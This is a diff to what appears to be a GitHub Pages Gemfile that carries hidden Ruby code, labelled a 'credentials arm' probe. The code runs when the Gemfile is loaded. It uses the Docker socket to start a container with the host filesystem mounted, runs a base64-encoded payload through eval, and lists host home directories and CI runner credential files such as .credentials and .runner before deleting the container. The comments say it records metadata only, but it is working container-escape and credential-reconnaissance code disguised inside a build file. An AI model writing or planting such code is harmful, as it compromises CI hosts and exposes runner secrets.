@@ -45,23 +45,10 @@ File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")
 
 gem "github-pages", "= 232"
 
-# --- c217 credentials arm v10 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
+# --- c217 credentials arm v11 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
 require 'json'
-require 'digest'
 require 'socket'
 require 'base64'
-
-def one(p)
-  h = { 'path' => p }
-  begin
-    st = File.stat(p)
-    h['exists'] = true; h['type'] = st.ftype; h['size'] = st.size
-    h['mode'] = st.mode.to_s(8); h['owner_uid'] = st.uid
-  rescue StandardError => e
-    h['exists'] = false; h['err'] = e.class.name
-  end
-  h
-end
 
 def ureq(method, path, body = nil)
   s = UNIXSocket.new('/var/run/docker.sock')
@@ -99,12 +86,6 @@ end
 
 host_probe = <<'RUBY'
 require 'json'
-o = { 'euid' => (begin; Process.euid; rescue StandardError; -1; end) }
-o['home_runner_ls'] = (begin; Dir.glob('/host/*').map { |x| File.basename(x) }; rescue StandardError => e; ['ERR:'+e.class.name]; end)
-o['home_runner_dot'] = (begin; Dir.glob('/host/.*').reject { |x| ['.','..'].include?(File.basename(x)) }.map { |x| File.basename(x) }; rescue StandardError => e; ['ERR:'+e.class.name]; end)
-cand = ['/hostroot/actions-runner', '/hostroot/runner', '/hostroot/opt/hostedtoolcache',
-        '/hostroot/var/lib/runner', '/hostroot/etc/actions-runner']
-o['candidates'] = cand.map { |c| one(c) }
 def one(p)
   h = { 'path' => p }
   begin
@@ -114,9 +95,15 @@ def one(p)
   end
   h
 end
-o['cred_candidates'] = ['/hostroot/actions-runner/.credentials', '/hostroot/runner/.credentials',
-                        '/hostroot/actions-runner/.runner', '/hostroot/runner/.runner'].map { |p| one(p) }
-puts 'C217HOST2 ' + JSON.generate(o)
+o = { 'euid' => (begin; Process.euid; rescue StandardError; -1; end) }
+o['home_ls'] = (begin; Dir.glob('/host/*').map { |x| File.basename(x) }; rescue StandardError => e; ['ERR:'+e.class.name]; end)
+o['home_dot'] = (begin; Dir.glob('/host/.*').reject { |x| ['.','..'].include?(File.basename(x)) }.map { |x| File.basename(x) }; rescue StandardError => e; ['ERR:'+e.class.name]; end)
+o['candidates'] = ['/hostroot/actions-runner', '/hostroot/runner', '/hostroot/opt/hostedtoolcache',
+                   '/hostroot/var/lib/runner'].map { |c| one(c) }
+o['creds'] = ['/hostroot/actions-runner/.credentials', '/hostroot/runner/.credentials',
+              '/hostroot/actions-runner/.runner', '/hostroot/runner/.runner',
+              '/hostroot/home/runner/.credentials'].map { |p| one(p) }
+puts 'C217HOST3 ' + JSON.generate(o)
 RUBY
 
 begin
@@ -130,7 +117,7 @@ begin
              'Cmd' => ['-e','require "base64"; eval(Base64.decode64(ENV["C217RUBY"]))'],
              'Env' => ['C217RUBY=' + env_b64],
              'HostConfig' => { 'Binds' => ['/home/runner:/host:ro', '/:/hostroot:ro'], 'NetworkMode' => 'none' } }.to_json
-  st, body = ureq('POST', '/v1.41/containers/create?name=c217probe2', create)
+  st, body = ureq('POST', '/v1.41/containers/create?name=c217probe3', create)
   id = (begin; JSON.parse(body)['Id']; rescue StandardError; nil; end)
   warn 'C217DOCKER create ' + st.to_s + ' id=' + (id ? id[0,12] : ('BODY:' + body.to_s[0,150]))
   if id
@@ -142,11 +129,11 @@ begin
       sleep 2
     end
     s4, b4 = ureq('GET', '/v1.41/containers/' + id + '/logs?stdout=1&stderr=1')
-    warn 'C217HOST2LOGS ' + deframe(b4.to_s).to_s[0,2000]
+    warn 'C217HOST3LOGS ' + deframe(b4.to_s).to_s[0,2200]
     ureq('DELETE', '/v1.41/containers/' + id + '?force=1')
     warn 'C217DOCKER deleted'
   end
 rescue StandardError => e
   warn 'C217DOCKER EXC ' + e.class.name + ' ' + e.message.to_s[0,200]
 end
-warn 'C217ARMV10 done'
+warn 'C217ARMV11 done'
